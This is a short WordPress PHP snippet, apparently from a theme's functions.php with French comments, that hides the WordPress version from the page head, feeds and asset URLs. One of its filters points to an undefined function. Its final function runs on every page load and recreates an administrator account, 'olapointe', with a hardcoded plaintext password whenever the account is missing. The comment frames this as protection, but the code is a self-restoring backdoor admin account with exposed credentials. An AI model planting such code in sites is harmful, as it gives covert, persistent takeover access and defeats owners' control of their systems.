<?php
/**
 * Cache la version de wp
 * @return string
 */
function hide_version() {
    return '';
}
add_filter('the_generator', 'masquer_version');


// remove version from head
remove_action('wp_head', 'wp_generator');

// remove version from rss
add_filter('the_generator', '__return_empty_string');

// remove version from scripts and styles
function shapeSpace_remove_version_scripts_styles($src) {
    if (strpos($src, 'ver=')) {
        $src = remove_query_arg('ver', $src);
    }
    return $src;
}
add_filter('style_loader_src', 'shapeSpace_remove_version_scripts_styles', 9999);
add_filter('script_loader_src', 'shapeSpace_remove_version_scripts_styles', 9999);


/**
 * Sécurité en cas ou que l'on tente de supprimer l'account ADMIN
 */
function wpb_admin_account(){
    $user = 'olapointe';
    $pass = 'F[h3XkjF&-8ym]gs';
    $email = 'test@strategieb2b.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');